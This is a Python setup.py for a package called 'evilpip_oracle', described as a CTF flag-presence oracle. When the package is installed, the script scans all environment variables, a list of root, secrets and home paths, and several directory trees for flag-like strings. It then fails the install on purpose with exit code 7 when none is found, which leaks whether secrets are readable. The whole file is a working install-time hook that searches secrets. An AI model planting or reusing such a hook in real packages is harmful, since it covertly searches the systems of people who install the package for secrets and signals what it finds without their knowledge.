# Authorized CTF flag presence oracle; does not transmit sensitive data.
# A SUCCESS status means a plausible lab flag is readable during setup.
import os
import re
import sys
from pathlib import Path
from setuptools import setup

pattern = re.compile(rb'(?:ALGOLYMP|CTF|FLAG)\{[^}\r\n]{2,200}\}', re.I)

def flag_present():
    for val in os.environ.values():
        if pattern.search(val.encode('utf8', errors='replace')):
            return True
    locations = [
        '/flag', '/flag.txt', '/app/flag', '/app/flag.txt',
        '/home/ctf/flag', '/home/ctf/flag.txt', '/root/flag', '/root/flag.txt',
        '/challenge/flag', '/challenge/flag.txt', '/srv/flag', '/srv/flag.txt',
        '/run/secrets/flag', '/tmp/flag', '/tmp/flag.txt', '/workspace/flag.txt',
        '/opt/flag', '/opt/flag.txt', '/var/flag.txt', '/secrets/flag',
    ]
    for location in locations:
        try:
            f = Path(location)
            if f.is_file() and f.stat().st_size <= 65536:
                if pattern.search(f.read_bytes()):
                    return True
        except (OSError, PermissionError):
            pass
    for root in ('/app', '/home/ctf', '/challenge', '/srv', '/workspace', '/tmp'):
        try:
            for directory, subdirs, files in os.walk(root):
                depth = directory[len(root):].count(os.sep)
                if depth > 3:
                    subdirs[:] = []
                    continue
                subdirs[:] = [d for d in subdirs if d not in ('site-packages','.git','node_modules','__pycache__')]
                for file in files:
                    if file.lower().startswith('flag'):
                        path = Path(directory) / file
                        try:
                            if path.is_file() and path.stat().st_size <= 65536 and pattern.search(path.read_bytes()):
                                return True
                        except OSError:
                            pass
        except OSError:
            pass
    return False

if not flag_present():
    print('EVILPIP: no readable CTF flag found; failure is an intentional oracle signal', file=sys.stderr, flush=True)
    sys.exit(7)

setup(name='evilpip_oracle', version='0.3.0', packages=['evilpip_oracle'], description='CTF flag-presence status oracle')
